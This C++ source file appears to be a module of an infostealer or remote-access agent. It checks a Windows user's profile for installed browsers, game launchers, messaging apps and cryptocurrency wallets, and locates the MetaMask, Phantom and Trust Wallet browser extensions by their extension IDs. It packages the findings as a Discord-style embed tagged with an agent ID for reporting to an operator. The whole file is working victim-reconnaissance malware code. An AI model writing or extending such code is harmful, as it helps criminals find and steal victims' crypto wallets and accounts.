#ifdef ENABLE_APPLICATIONS
#include "commands/Applications.h"
#include "nlohmann/json.hpp"

using json = nlohmann::json;

std::string CreateJSONPayload(const std::unordered_map<std::string, std::string>& app_results, const std::string& agentIdStr, bool success) {
    json jsonPayload = {
        {"embeds", {
            {
                {"title", success ? "**Installed Applications**" : "**Applications Retrieval Failed**"},
                {"description", "Agent ID: " + agentIdStr},
                {"color", success ? 0x00FF00 : 0xFF0000},
                {"fields", json::array()},
                {"footer", {{"text", success ? "Success" : "Error"}}}
            }
        }}
    };

    if (!success) {
        jsonPayload["embeds"][0]["fields"].push_back({
            {"name", "Error"},
            {"value", "Failed to retrieve applications list"},
            {"inline", false}
            });
        return jsonPayload.dump(4);
    }

    auto& fields = jsonPayload["embeds"][0]["fields"];

    std::string browsers_value = "";
    for (const auto& app : { "Chrome", "Firefox", "Bing", "Opera", "Opera GX", "Yandex", "Brave" }) {
        auto it = app_results.find(app);
        if (it != app_results.end()) {
            browsers_value += it->second.empty()
                ? "- **" + it->first + "**: Not installed\n"
                : "- **" + it->first + "**: " + it->second + "\n";
        }
    }
    fields.push_back({
        {"name", "Browsers:"},
        {"value", browsers_value.empty() ? "None detected" : browsers_value},
        {"inline", false}
        });

    std::string launchers_value = "";
    for (const auto& app : { "Epic Games", "Steam", "Minecraft", "Roblox Player", "Roblox Studio", "Valorant" }) {
        auto it = app_results.find(app);
        if (it != app_results.end()) {
            launchers_value += it->second.empty()
                ? "- **" + it->first + "**: Not installed\n"
                : "- **" + it->first + "**: " + it->second + "\n";
        }
    }
    fields.push_back({
        {"name", "Launchers:"},
        {"value", launchers_value.empty() ? "None detected" : launchers_value},
        {"inline", false}
        });

    std::string comms_value = "";
    for (const auto& app : { "Discord", "Teams", "Telegram", "Zoom" }) {
        auto it = app_results.find(app);
        if (it != app_results.end()) {
            comms_value += it->second.empty()
                ? "- **" + it->first + "**: Not installed\n"
                : "- **" + it->first + "**: " + it->second + "\n";
        }
    }
    fields.push_back({
        {"name", "Communication:"},
        {"value", comms_value.empty() ? "None detected" : comms_value},
        {"inline", false}
        });

    std::string productivity_value = "";
    for (const auto& app : { "Notion" }) {
        auto it = app_results.find(app);
        if (it != app_results.end()) {
            productivity_value += it->second.empty()
                ? "- **" + it->first + "**: Not installed\n"
                : "- **" + it->first + "**: " + it->second + "\n";
        }
    }
    fields.push_back({
        {"name", "Productivity:"},
        {"value", productivity_value.empty() ? "None detected" : productivity_value},
        {"inline", false}
        });

    std::string wallets_value = "";
    for (const auto& app : { "Exodus", "MetaMask", "Phantom", "Coinbase", "Trust Wallet" }) {
        auto it = app_results.find(app);
        if (it != app_results.end()) {
            wallets_value += it->second.empty()
                ? "- **" + it->first + "**: Not installed\n"
                : "- **" + it->first + "**: " + it->second + "\n";
        }
    }
    fields.push_back({
        {"name", "Wallets:"},
        {"value", wallets_value.empty() ? "None detected" : wallets_value},
        {"inline", false}
        });

    return jsonPayload.dump(4);
}

std::unordered_map<std::string, std::string> GetInstalledApplications(const std::string& user_profile) {
    std::unordered_map<std::string, std::string> app_paths = {
        {"Chrome", R"(C:\Program Files\Google\Chrome\Application\chrome.exe)"},
        {"Firefox", R"(C:\Program Files\Mozilla Firefox\firefox.exe)"},
        {"Bing", R"(C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe)"},
        {"Opera", user_profile + R"(\AppData\Local\Programs\Opera\opera.exe)"},
        {"Opera GX", user_profile + R"(\AppData\Local\Programs\Opera GX\opera.exe)"},
        {"Yandex", user_profile + R"(\AppData\Local\Yandex\YandexBrowser\Application\browser.exe)"},
        {"Epic Games", R"(C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe)"},
        {"Steam", R"(C:\Program Files (x86)\Steam\steam.exe)"},
        {"Teams", user_profile + R"(\AppData\Local\Microsoft\Teams\Update.exe)"},
        {"Minecraft", user_profile + R"(\curseforge\minecraft\Install\minecraft.exe)"},
        {"Telegram", user_profile + R"(\AppData\Roaming\Telegram Desktop\Telegram.exe)"},
        {"Exodus", user_profile + R"(\AppData\Local\Exodus\Exodus.exe)"},
        {"Brave", R"(C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe)"},
        {"Zoom", user_profile + R"(\AppData\Roaming\Zoom\bin\Zoom.exe)"},
        {"Notion", user_profile + R"(\AppData\Local\Programs\Notion\Notion.exe)"},
        {"Valorant", R"(C:\Riot Games\VALORANT\live\VALORANT.exe)"},
        {"Coinbase", user_profile + R"(\AppData\Local\Programs\Coinbase\Coinbase.exe)"}
    };

    std::unordered_map<std::string, std::string> app_results;

    for (const auto& [app, path] : app_paths) {
        if (std::filesystem::exists(path)) {
            app_results[app] = path;
        }
        else {
            app_results[app] = "";
        }
    }

    std::string discord_base = user_profile + R"(\AppData\Local\Discord)";
    if (std::filesystem::exists(discord_base)) {
        for (const auto& entry : std::filesystem::directory_iterator(discord_base)) {
            if (entry.is_directory() && entry.path().filename().string().find("app-") == 0) {
                std::filesystem::path exe_path = entry.path() / "Discord.exe";
                if (std::filesystem::exists(exe_path)) {
                    app_results["Discord"] = exe_path.string();
                    break;
                }
            }
        }
    }
    if (app_results.find("Discord") == app_results.end()) {
        app_results["Discord"] = "";
    }

    std::string roblox_player_base = R"(C:\Program Files (x86)\Roblox\Versions)";
    if (std::filesystem::exists(roblox_player_base)) {
        for (const auto& entry : std::filesystem::directory_iterator(roblox_player_base)) {
            if (entry.is_directory()) {
                std::filesystem::path exe_path = entry.path() / "RobloxPlayerBeta.exe";
                if (std::filesystem::exists(exe_path)) {
                    app_results["Roblox Player"] = exe_path.string();
                    break;
                }
            }
        }
    }
    if (app_results.find("Roblox Player") == app_results.end()) {
        app_results["Roblox Player"] = "";
    }

    std::string roblox_studio_base = user_profile + R"(\AppData\Local\Roblox\Versions)";
    if (std::filesystem::exists(roblox_studio_base)) {
        for (const auto& entry : std::filesystem::directory_iterator(roblox_studio_base)) {
            if (entry.is_directory()) {
                std::filesystem::path exe_path = entry.path() / "RobloxStudioBeta.exe";
                if (std::filesystem::exists(exe_path)) {
                    app_results["Roblox Studio"] = exe_path.string();
                    break;
                }
            }
        }
    }
    if (app_results.find("Roblox Studio") == app_results.end()) {
        app_results["Roblox Studio"] = "";
    }

    const std::string metamask_id = "nkbihfbeogaeaoehlefnkodbefgpgknn";
    const std::string phantom_id = "bfnaelmomeimhlpmgjnjophhpkkoljpa";
    const std::string trustwallet_id = "egjidjbpglichdcondbcbdnbeeppgdph";
    std::vector<std::pair<std::string, std::string>> browser_extension_paths = {
        {"Chrome", user_profile + R"(\AppData\Local\Google\Chrome\User Data\Default\Extensions\)"},
        {"Brave", user_profile + R"(\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions\)"},
        {"Bing", user_profile + R"(\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\)"},
        {"Firefox", user_profile + R"(\AppData\Roaming\Mozilla\Firefox\Profiles)"}
    };

    std::string metamask_path = "";
    for (const auto& [browser, base_path] : browser_extension_paths) {
        if (browser == "Firefox") {
            if (std::filesystem::exists(base_path)) {
                for (const auto& profile : std::filesystem::directory_iterator(base_path)) {
                    if (profile.is_directory()) {
                        std::filesystem::path ext_path = profile.path() / "extensions" / (metamask_id + "@metamask.io");
                        if (std::filesystem::exists(ext_path)) {
                            metamask_path = ext_path.string();
                            break;
                        }
                    }
                }
            }
        }
        else {
            std::string ext_path = base_path + metamask_id;
            if (std::filesystem::exists(ext_path)) {
                for (const auto& version : std::filesystem::directory_iterator(ext_path)) {
                    if (version.is_directory()) {
                        metamask_path = version.path().string();
                        break;
                    }
                }
            }
        }
        if (!metamask_path.empty()) break;
    }
    app_results["MetaMask"] = metamask_path;

    std::string phantom_path = "";
    for (const auto& [browser, base_path] : browser_extension_paths) {
        if (browser == "Firefox") {
            if (std::filesystem::exists(base_path)) {
                for (const auto& profile : std::filesystem::directory_iterator(base_path)) {
                    if (profile.is_directory()) {
                        std::filesystem::path ext_path = profile.path() / "extensions" / (phantom_id + "@phantom.app");
                        if (std::filesystem::exists(ext_path)) {
                            phantom_path = ext_path.string();
                            break;
                        }
                    }
                }
            }
        }
        else {
            std::string ext_path = base_path + phantom_id;
            if (std::filesystem::exists(ext_path)) {
                for (const auto& version : std::filesystem::directory_iterator(ext_path)) {
                    if (version.is_directory()) {
                        phantom_path = version.path().string();
                        break;
                    }
                }
            }
        }
        if (!phantom_path.empty()) break;
    }
    app_results["Phantom"] = phantom_path;

    std::string trustwallet_path = "";
    for (const auto& [browser, base_path] : browser_extension_paths) {
        if (browser == "Firefox") {
            if (std::filesystem::exists(base_path)) {
                for (const auto& profile : std::filesystem::directory_iterator(base_path)) {
                    if (profile.is_directory()) {
                        std::filesystem::path ext_path = profile.path() / "extensions" / (trustwallet_id + "@trustwallet.com");
                        if (std::filesystem::exists(ext_path)) {
                            trustwallet_path = ext_path.string();
                            break;
                        }
                    }
                }
            }
        }
        else {
            std::string ext_path = base_path + trustwallet_id;
            if (std::filesystem::exists(ext_path)) {
                for (const auto& version : std::filesystem::directory_iterator(ext_path)) {
                    if (version.is_directory()) {
                        trustwallet_path = version.path().string();
                        break;
                    }
                }
            }
        }
        if (!trustwallet_path.empty()) break;
    }
    app_results["Trust Wallet"] = trustwallet_path;

    return app_results;
}

std::string GetUserProfile() {
    char* user_profile_ptr = nullptr;
    size_t len;
    errno_t err = _dupenv_s(&user_profile_ptr, &len, "USERPROFILE");
    std::string user_profile;
    if (err == 0 && user_profile_ptr != nullptr) {
        user_profile = std::string(user_profile_ptr);
    }
    else {
    }
    free(user_profile_ptr);
    return user_profile;
}
#endif